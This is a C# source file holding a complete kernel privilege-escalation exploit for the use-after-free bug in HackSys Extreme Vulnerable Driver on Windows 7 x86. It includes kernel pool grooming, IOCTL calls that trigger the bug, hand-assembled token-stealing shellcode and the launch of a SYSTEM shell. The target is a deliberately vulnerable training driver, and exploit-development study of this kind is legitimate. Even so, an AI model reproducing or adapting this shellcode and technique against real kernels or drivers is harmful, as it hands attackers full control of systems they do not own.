using System;
using System.Runtime.InteropServices;
using System.Text;

namespace UseAfterFree
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            byte[] InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            ref int pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);

        [DllImport("ntdll.dll")]
        static extern int NtAllocateReserveObject(
            ref IntPtr hObject,
            uint ObjectAttributes,
            uint ObjectType);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        // Global variables
        static IntPtr hDevice = IntPtr.Zero;
        static IntPtr[] HeapObjects_1 = new IntPtr[10000];
        static IntPtr[] HeapObjects_2 = new IntPtr[5000];

        // Helper functions
        static void Initialize()
        {
            for (int i = 0; i < 10000; i++)
            {
                HeapObjects_1[i] = IntPtr.Zero;
            }
            for (int i = 0; i < 5000; i++)
            {
                HeapObjects_2[i] = IntPtr.Zero;
            }
        }

        static void CleanUp()
        {
            Console.WriteLine("[>] Cleaning up handle object(s)");
            if (hDevice != IntPtr.Zero)
            {
                if (CloseHandle(hDevice))
                {
                    hDevice = IntPtr.Zero;
                }
                else
                {
                    Console.WriteLine("[!] Failed to close a kernel driver's handle (code={0})", Marshal.GetLastWin32Error());
                }
            }

            for (int i = 0; i < 10000; i++)
            {
                if (HeapObjects_1[i] != IntPtr.Zero)
                {
                    if (CloseHandle(HeapObjects_1[i]))
                    {
                        HeapObjects_1[i] = IntPtr.Zero;
                    }
                    else
                    {
                        Console.WriteLine("[!] Failed to close a heap object handle (code={0})", Marshal.GetLastWin32Error());
                    }
                }
            }

            for (int i = 0; i < 5000; i++)
            {
                if (HeapObjects_2[i] != IntPtr.Zero)
                {
                    if (CloseHandle(HeapObjects_2[i]))
                    {
                        HeapObjects_2[i] = IntPtr.Zero;
                    }
                    else
                    {
                        Console.WriteLine("[!] Failed to close a heap object handle (code={0})", Marshal.GetLastWin32Error());
                    }
                }
            }
        }

        static bool IsWin7x86()
        {
            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int MajorVersion = 0;
            int MinorVersion = 0;
            int BuildNumber = 0;
            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
            BuildNumber &= 0xFFFF;

            if (MajorVersion == 6 && MinorVersion == 1 && BuildNumber == 7601 &&
                string.Compare(arch, "x86", StringComparison.OrdinalIgnoreCase) == 0)
            {
                Console.WriteLine("[+] Windows 7 SP1 x86 is detected");
                return true;
            }
            else
            {
                Console.WriteLine("[-] Unsupported OS is detected");
                return false;
            }
        }

        static bool IsSystem()
        {
            string user = Environment.UserName;

            if (string.Compare(user, "SYSTEM", StringComparison.OrdinalIgnoreCase) == 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        static bool SpawnShell()
        {
            string ApplicationName = "C:\\Windows\\System32\\cmd.exe";
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            uint CREATE_NEW_CONSOLE = 0x00000010;
            string CurrentDirectory = "C:\\Windows\\System32";
            STARTUPINFO si = new STARTUPINFO();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            bool status = CreateProcess(
                ApplicationName, null, ref pSec, ref tSec, false,
                CREATE_NEW_CONSOLE, IntPtr.Zero, CurrentDirectory,
                ref si, out PROCESS_INFORMATION pi);

            if (status)
            {
                Console.WriteLine("[+] Shell is spawned successfully (PID = {0})", pi.dwProcessId);
                WaitForSingleObject(pi.hProcess, 500);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else
            {
                Console.WriteLine("[!] Failed to spawn shell (code={0})", Marshal.GetLastWin32Error());
            }

            return status;
        }

        static bool AllocateUAFObject(IntPtr hDevice, byte[] payload)
        {
            uint ioctl = 0x222013;
            int BytesReturned = 0;
            bool status  = DeviceIoControl(hDevice, ioctl, payload, payload.Length, IntPtr.Zero, 0, ref BytesReturned, IntPtr.Zero);

            if (!status)
            {
                Console.WriteLine("[-] Failed to send payload (code={0})", Marshal.GetLastWin32Error());
            }

            return status;
        }

        static bool UseUAFObject(IntPtr hDevice, byte[] payload)
        {
            uint ioctl = 0x222017;
            int BytesReturned = 0;
            bool status  = DeviceIoControl(hDevice, ioctl, payload, payload.Length, IntPtr.Zero, 0, ref BytesReturned, IntPtr.Zero);

            if (!status)
            {
                Console.WriteLine("[-] Failed to send payload (code={0})", Marshal.GetLastWin32Error());
            }

            return status;
        }

        static bool FreeUAFObject(IntPtr hDevice, byte[] payload)
        {
            uint ioctl = 0x22201B;
            int BytesReturned = 0;
            bool status  = DeviceIoControl(hDevice, ioctl, payload, payload.Length, IntPtr.Zero, 0, ref BytesReturned, IntPtr.Zero);

            if (!status)
            {
                Console.WriteLine("[-] Failed to send payload (code={0})", Marshal.GetLastWin32Error());
            }

            return status;
        }

        static bool AllocateFakeUAFObject(IntPtr hDevice, byte[] payload)
        {
            uint ioctl = 0x22201F;
            int BytesReturned = 0;
            bool status = DeviceIoControl(hDevice, ioctl, payload, payload.Length, IntPtr.Zero, 0, ref BytesReturned, IntPtr.Zero);

            if (!status)
            {
                Console.WriteLine("[-] Failed to send payload (code={0})", Marshal.GetLastWin32Error());
            }

            return status;
        }

        static void HeapFengShui()
        {
            IntPtr hObject = IntPtr.Zero;
            int ntstatus;
            int NT_SUCCESS = 0;

            // Derandomize
            for (int i = 0; i < 10000; i++)
            {
                hObject = IntPtr.Zero;
                ntstatus = NtAllocateReserveObject(ref hObject, 0, 1);

                if (ntstatus == NT_SUCCESS)
                {
                    HeapObjects_1[i] = hObject;
                }
            }

            // Sequential Heap Object
            for (int i = 0; i < 5000; i++)
            {
                hObject = IntPtr.Zero;
                ntstatus = NtAllocateReserveObject(ref hObject, 0, 1);

                if (ntstatus == NT_SUCCESS)
                {
                    HeapObjects_2[i] = hObject;
                }
            }

            // Create Hole
            for (int i = 0; i < 5000; i += 2)
            {
                if (CloseHandle(HeapObjects_2[i]))
                {
                    HeapObjects_2[i] = IntPtr.Zero;
                }
            }
        }

        // Main function
        static void Main()
        {
            byte[] shellcode = {
                //--[Setup]
                0x60,                               // pushad
                0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, // mov eax, fs:[KTHREAD_OFFSET]
                0x8B, 0x40, 0x50,                   // mov eax, [eax + EPROCESS_OFFSET]
                0x89, 0xC1,                         // mov ecx, eax (Current _EPROCESS structure)
                0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, // mov ebx, [eax + TOKEN_OFFSET]
                //--[Copy System PID token]
                0xBA, 0x04, 0x00, 0x00, 0x00,       // mov edx, 4 (SYSTEM PID)
                0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, // mov eax, [eax + FLINK_OFFSET] <-|
                0x2D, 0xB8, 0x00, 0x00, 0x00,       // sub eax, FLINK_OFFSET           |
                0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, // cmp [eax + PID_OFFSET], edx     |
                0x75, 0xED,                         // jnz                           ->|
                0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, // mov edx, [eax + TOKEN_OFFSET]
                0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, // mov [ecx + TOKEN_OFFSET], edx
                //--[Recover]
                0x61,                               // popad
                0xC3                                // ret
            };

            Initialize();

            Console.WriteLine("--[ HEVD Exploitation : Use-After-Free\n");

            if (!IsWin7x86())
            {
                return;
            }

            // Step 1: Allocate Token Stealing Shellcode
            IntPtr ShellcodeBuffer;
            uint dwSize = 0x1000;
            uint MEM_COMMIT = 0x00001000;
            uint MEM_RESERVE = 0x00002000;
            uint PAGE_EXECUTE_READWRITE = 0x40;

            Console.WriteLine("[>] Trying to allocate shellcode.");
            ShellcodeBuffer = VirtualAlloc(IntPtr.Zero, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (ShellcodeBuffer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to VirtualAlloc (code={0})", Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] Allocated {0} bytes buffer at 0x{1}.", dwSize, ShellcodeBuffer.ToString("X8"));
            Marshal.Copy(shellcode, 0, ShellcodeBuffer, shellcode.Length);
            Console.WriteLine("[+] Shellcode is allocated at 0x{0}", ShellcodeBuffer.ToString("X8"));

            // Step 2: Open driver's handle
            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
            uint GENERIC_READ = 0x80000000;
            uint GENERIC_WRITE = 0x40000000;
            uint FILE_SHARE_READ = 0x00000001;
            uint FILE_SHARE_WRITE = 0x00000002;
            uint OPEN_EXISTING = 0x3;
            uint FILE_ATTRIBUTE_NORMAL = 0x80;
            uint FILE_FLAG_OVERWRAPPED = 0x40000000;
            IntPtr invalid = new IntPtr(-1);

            Console.WriteLine("[>] Opening {0}", deviceName);
            hDevice = CreateFile(
                deviceName, GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERWRAPPED, IntPtr.Zero);

            if (hDevice == invalid)
            {
                Console.WriteLine("[-] Failed to open {0} (code={1})", deviceName, Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] HEVD.sys is opened succesfuly (hDevice = 0x{0})", hDevice.ToString("X"));

            // Step 3: Heap Feng Shui
            Console.WriteLine("[>] Heap Feng Shui");
            HeapFengShui();

            // Step 4: Allocate and free a UAF object
            Console.WriteLine("[>] Allocating and freeing a UAF object");
            byte[] payload = BitConverter.GetBytes((uint)0xdeadbeef);
            AllocateUAFObject(hDevice, payload);
            FreeUAFObject(hDevice, payload);

            // Step 5: Fill heap hole with fake UAF objects
            byte[] FakeObjectData = new byte[0x58];
            byte[] pointer = BitConverter.GetBytes(ShellcodeBuffer.ToInt32());
            int pointerSize = Marshal.SizeOf(typeof(IntPtr));
            int paddingSize = 0x58 - pointerSize - 1;
            byte[] padding = Encoding.ASCII.GetBytes(new String('A', paddingSize));

            Buffer.BlockCopy(pointer, 0, FakeObjectData, 0, pointerSize);
            Buffer.BlockCopy(padding, 0, FakeObjectData, pointerSize, paddingSize);

            Console.WriteLine("[>] Filling up heap holes with fake UAF objects");
            for (int i = 0; i < 2500; i++)
            {
                AllocateFakeUAFObject(hDevice, FakeObjectData);
            }

            // Step 6: Trigger use-after-free and execute token stealing shellcode
            Console.WriteLine("[>] Trigger Use-After-Free");
            UseUAFObject(hDevice, payload);

            // Step 7: Clean up kernel heap
            Console.WriteLine("[>] Cleaning up kernel heap");
            CleanUp();

            // Step 8: Spawn SYSTEM shell
            if (IsSystem() && SpawnShell())
            {
                Console.WriteLine("[+] Exploit is completed successfully");
            }
            else
            {
                Console.WriteLine("[-] Failed to exploit");
            }
        }
    }
}